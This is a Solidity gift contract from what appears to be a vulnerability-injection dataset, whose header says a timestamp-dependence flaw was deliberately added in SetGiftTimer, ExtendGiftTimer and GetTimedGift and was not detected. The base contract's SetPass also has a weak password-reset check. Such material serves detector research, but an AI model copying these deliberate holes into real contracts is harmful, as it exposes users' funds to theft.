/*
 * ===== SmartInject Injection Details =====
 * Function      : SetGiftTimer
 * Vulnerability : Timestamp Dependence
 * Status        : Not Detected
 * Type          : Fallback Function Addition
 *
 * === Verification Results ===
 * Detected      : False
 * Relevant      : 0 findings
 * Total Found   : 2 issues
 * Retry Count   : 0
 *
 * === Description ===
 * This vulnerability introduces timestamp dependence through a multi-transaction time-based gift system. The exploit requires: 1) First transaction to set the initial timer via SetGiftTimer(), 2) Second transaction to extend the timer via ExtendGiftTimer(), 3) Third transaction to claim the gift via GetTimedGift(). The vulnerability allows miners to manipulate timestamps to either prevent legitimate claims or enable premature claims. The state persists across transactions through giftUnlockTime and timerSet variables, making this a stateful vulnerability requiring multiple transactions to exploit.
 */
pragma solidity ^0.4.19;

contract NEW_YEARS_GIFT
{
    string message;
    
    bool passHasBeenSet = false;
    
    address sender;
    
    bytes32 public hashPass;
	
	function() public payable{}
    
    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )
        {
            hashPass = hash;
            sender = msg.sender;
        }
    }
    
    function SetMessage(string _message)
    public
    {
        if(msg.sender==sender)
        {
            message =_message;
        }
    }
    
    function GetGift(bytes pass)
    external
    payable
    returns (string)
    {
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
            return message;
        }
    }
    
    function Revoce()
    public
    payable
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
            message="";
        }
    }
    
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(msg.sender==sender&&hash==hashPass)
        {
           passHasBeenSet=true;
        }
    }

    // === FALLBACK INJECTION: Timestamp Dependence ===
    // This function was added as a fallback when existing functions failed injection
    uint256 public giftUnlockTime;
    bool public timerSet = false;
    
    function SetGiftTimer(uint256 _unlockTime)
    public
    payable
    {
        if(msg.sender==sender && !timerSet)
        {
            giftUnlockTime = _unlockTime;
            timerSet = true;
        }
    }
    
    function ExtendGiftTimer(uint256 _additionalTime)
    public
    payable
    {
        if(msg.sender==sender && timerSet)
        {
            if(now + _additionalTime > giftUnlockTime)
            {
                giftUnlockTime = now + _additionalTime;
            }
        }
    }
    
    function GetTimedGift(bytes pass)
    external
    payable
    returns (string)
    {
        if(hashPass == sha3(pass) && timerSet)
        {
            if(now >= giftUnlockTime)
            {
                msg.sender.transfer(this.balance);
                return message;
            }
        }
    }
    // === END FALLBACK INJECTION ===

}